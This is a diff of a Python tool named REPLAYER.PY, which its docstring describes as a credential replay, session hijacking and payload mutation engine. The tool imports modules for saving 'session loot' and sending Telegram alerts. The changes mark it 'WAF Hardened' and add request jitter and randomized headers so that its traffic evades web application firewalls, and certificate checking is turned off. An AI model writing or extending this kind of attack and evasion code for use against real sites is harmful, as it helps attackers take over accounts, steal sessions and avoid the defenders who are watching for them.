@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-REPLAYER.PY — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (With Telegram Telemetry)
+REPLAYER.PY v8.5 — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (WAF Hardened)
 Features:
 - Stateful response-diffing to detect successful authentication anomalies
 - Dynamic payload mutation and context-aware injection fuzzing
@@ -22,10 +22,11 @@ from urllib.parse import urlsplit
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 TIMEOUT = 8
 MAX_ENDPOINTS = 8
-USER_AGENT = "BruteDog-AdaptiveReplayer/8.0"
+USER_AGENT = "BruteDog-AdaptiveReplayer/8.5"
 
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
@@ -69,11 +70,13 @@ def normalize_target(target):
     return f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"
 
 def http_request(url, headers=None, method="GET", data=None):
+    apply_behavioral_jitter()
     request_headers = {
         "User-Agent": USER_AGENT,
         "Accept": "text/html,application/json,*/*",
         "Cache-Control": "no-cache",
     }
+    request_headers.update(get_randomized_hints())
     if headers:
         request_headers.update(headers)
     
